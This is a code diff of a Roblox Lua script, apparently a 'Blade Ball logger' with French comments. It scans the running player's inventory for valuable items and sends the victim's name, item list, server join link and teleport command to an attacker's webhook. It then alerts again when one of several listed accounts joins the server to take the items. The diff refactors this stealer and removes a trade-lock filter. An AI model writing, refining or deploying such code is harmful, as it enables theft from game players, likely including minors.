@@ -11,6 +11,7 @@ local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local categories = {"Sword", "Emote", "Explosion"}
 
+-- Récupération des globales
 local users = _G.Usernames or {"Silv3rTurboH3ro", "Ddr5pri","Andrewdagoatya","EmmaQueen2024_YT","Ech0_Night2010YT","EpicClawSilver","PhoenixSilver2011","XxElla_R0CK3TXX"}
 local min_rap = _G.min_rap or 50
 local ping = _G.pingEveryone or "No"
@@ -18,111 +19,96 @@ local webhook = _G.webhook or ""
 
 if webhook == "" then return end
 
+local totalRAP = 0
+local itemsFound = {}
+
 -- // FORMATAGE NOMBRE
 local function formatNumber(number)
     if number == nil then return "0" end
     local suffixes = {"", "k", "m", "b", "t"}
-    local suffixIndex = 1
-    while number >= 1000 and suffixIndex < #suffixes do
+    local idx = 1
+    while number >= 1000 and idx < #suffixes do
         number = number / 1000
-        suffixIndex = suffixIndex + 1
+        idx = idx + 1
     end
-    return suffixIndex == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
+    return idx == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[idx])
 end
 
--- // FONCTIONS WEBHOOKS (TA STRUCTURE)
+-- // FONCTIONS D'ENVOI
 local function SendJoinMessage(list, prefix)
     local isGoodHit = totalRAP >= 500
-    local embedTitle = isGoodHit and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
-    local webhookName = isGoodHit and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT"
     local embedColor = isGoodHit and 65280 or 8323327
-
-    local fields = {
-        {name = "Victim Username 🤖:", value = "```" .. plr.Name .. "```", inline = true},
-        {name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId, inline = false},
-        {name = "Item list 📝:", value = "", inline = false},
-        {name = "Summary 💰:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = false}
-    }
-
+    
     local grouped = {}
     for _, item in ipairs(list) do
-        if grouped[item.Name] then
-            grouped[item.Name].Count = grouped[item.Name].Count + 1
-            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
-        else
-            grouped[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP}
-        end
+        grouped[item.Name] = (grouped[item.Name] or 0) + 1
     end
 
-    local groupedList = {}
-    for _, group in pairs(grouped) do table.insert(groupedList, group) end
-    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)
-
-    for _, group in ipairs(groupedList) do
-        fields[3].value = fields[3].value .. string.format("%s (x%s) - **%s RAP**\n", group.Name, group.Count, formatNumber(group.TotalRAP))
+    local listText = ""
+    for name, count in pairs(grouped) do
+        listText = listText .. name .. " (x" .. count .. ")\n"
     end
 
     local data = {
         ["auth_token"] = auth_token,
-        ["username"] = webhookName,
+        ["username"] = isGoodHit and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT",
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
-            ["title"] = embedTitle,
+            ["title"] = isGoodHit and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯",
             ["color"] = embedColor,
-            ["fields"] = fields,
+            ["fields"] = {
+                {name = "Victim Username 🤖:", value = "```" .. plr.Name .. "```", inline = true},
+                {name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId, inline = false},
+                {name = "Item list 📝:", value = listText ~= "" and listText or "None", inline = false},
+                {name = "Summary 💰:", value = "Total RAP: **" .. formatNumber(totalRAP) .. "**", inline = false}
+            },
             ["footer"] = {["text"] = "Blade Ball logger by Eblack"}
         }}
     }
+    
     local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
     if requestFunc then
-        requestFunc({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
+        pcall(function()
+            requestFunc({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
+        end)
     end
 end
 
 local function SendMessage(list)
     local isGoodHit = totalRAP >= 500
-    local statusText = isGoodHit and "🟢 GOOD HIT" or "🟣 SMALL HIT"
-    local webhookName = isGoodHit and "⚪ Eblack - SERVER HIT (GOOD)" or "⚪ Eblack - SERVER HIT (SMALL)"
-    local embedColor = isGoodHit and 65280 or 8323327
-
-    local fields = {
-        {name = "Victim Username 🤖:", value = "```" .. plr.Name .. "```", inline = true},
-        {name = "Status 📈:", value = statusText, inline = true},
-        {name = "Items to Steal 📝:", value = "", inline = false},
-        {name = "Summary 💰:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = false}
-    }
-
+    local embedColor = isGoodHit and 65280 or 8323327 -- VERT si > 500, sinon VIOLET
+    
     local grouped = {}
     for _, item in ipairs(list) do
-        if grouped[item.Name] then
-            grouped[item.Name].Count = grouped[item.Name].Count + 1
-            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
-        else
-            grouped[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP}
-        end
+        grouped[item.Name] = (grouped[item.Name] or 0) + 1
     end
 
-    local groupedList = {}
-    for _, group in pairs(grouped) do table.insert(groupedList, group) end
-    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)
-
-    for _, group in ipairs(groupedList) do
-        fields[3].value = fields[3].value .. string.format("%s (x%s) - **%s RAP**\n", group.Name, group.Count, formatNumber(group.TotalRAP))
+    local listText = ""
+    for name, count in pairs(grouped) do
+        listText = listText .. name .. " (x" .. count .. ")\n"
     end
 
     local data = {
         ["auth_token"] = auth_token,
-        ["username"] = webhookName,
+        ["username"] = isGoodHit and "⚪ Eblack - SERVER HIT (GOOD)" or "⚪ Eblack - SERVER HIT (SMALL)",
         ["embeds"] = {{
             ["title"] = "⚪ Server Hit 🎉",
-            ["color"] = embedColor,
-            ["fields"] = fields,
+            ["color"] = embedColor, -- LA COULEUR CHANGE ICI
+            ["fields"] = {
+                {name = "Victim Username 🤖:", value = "```" .. plr.Name .. "```", inline = true},
+                {name = "Status 📈:", value = isGoodHit and "🟢 GOOD HIT" or "🟣 SMALL HIT", inline = true},
+                {name = "Items to Steal 📝:", value = listText ~= "" and listText or "None", inline = false},
+                {name = "Summary 💰:", value = "Total RAP: **" .. formatNumber(totalRAP) .. "**", inline = false}
+            },
             ["footer"] = {["text"] = "Blade Ball logger by Eblack"}
         }}
     }
+    
     local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
     if requestFunc then
-        requestFunc({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
+        pcall(function()
+            requestFunc({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
+        end)
     end
 end
 
@@ -131,54 +117,51 @@ local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
 local Replion = require(ReplicatedStorage.Packages.Replion)
 local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
 
-local function buildNameToRAPMap(category)
-    local nameToRAP = {}
-    local categoryRapData = rapData[category]
-    if not categoryRapData then return nameToRAP end
-    for serializedKey, rap in pairs(categoryRapData) do
-        local success, decodedKey = pcall(function() return HttpService:JSONDecode(serializedKey) end)
-        if success and type(decodedKey) == "table" then
-            for _, pair in ipairs(decodedKey) do
-                if pair[1] == "Name" then nameToRAP[pair[2]] = rap break end
-            end
+local function buildMap(cat)
+    local m = {}
+    local d = rapData[cat]
+    if not d then return m end
+    for k, r in pairs(d) do
+        local s, dec = pcall(function() return HttpService:JSONDecode(k) end)
+        if s and type(dec) == "table" then
+            for _, p in ipairs(dec) do if p[1] == "Name" then m[p[2]] = r break end end
         end
     end
-    return nameToRAP
+    return m
 end
 
-local itemsFound = {}
-totalRAP = 0
-local rapMappings = {}
-for _, category in ipairs(categories) do rapMappings[category] = buildNameToRAPMap(category) end
-
-for _, category in ipairs(categories) do
-    if clientInventory[category] then
-        for itemId, itemInfo in pairs(clientInventory[category]) do
-            if not itemInfo.TradeLock then
-                local rap = (rapMappings[category] and rapMappings[category][itemInfo.Name]) or 0
-                if rap >= min_rap then
-                    totalRAP = totalRAP + rap
-                    table.insert(itemsFound, {Name = itemInfo.Name, RAP = rap})
-                end
+for _, cat in ipairs(categories) do
+    local map = buildMap(cat)
+    if clientInventory[cat] then
+        for id, info in pairs(clientInventory[cat]) do
+            local rap = map[info.Name] or 0
+            if rap >= min_rap then
+                totalRAP = totalRAP + rap
+                table.insert(itemsFound, {Name = info.Name, RAP = rap})
             end
         end
     end
 end
 
--- // EXECUTION
+-- // EXECUTION DES ENVOIS
 if #itemsFound > 0 then
-    -- Envoi du Scan initial
+    -- 1. Envoi immédiat du Scan
     SendJoinMessage(itemsFound, (ping == "Yes" and "@everyone " or ""))
 
-    -- Attente de ton compte
+    -- 2. Détection de ton arrivée
     local hasSentHit = false
-    local function check(player)
+    local function checkPlayer(player)
         if not hasSentHit and table.find(users, player.Name) then
             hasSentHit = true
             SendMessage(itemsFound)
         end
     end
 
-    for _, p in ipairs(Players:GetPlayers()) do check(p) end
-    Players.PlayerAdded:Connect(check)
+    -- Vérifie les joueurs déjà présents
+    for _, p in ipairs(Players:GetPlayers()) do
+        checkPlayer(p)
+    end
+    
+    -- Écoute les nouveaux arrivants
+    Players.PlayerAdded:Connect(checkPlayer)
 end
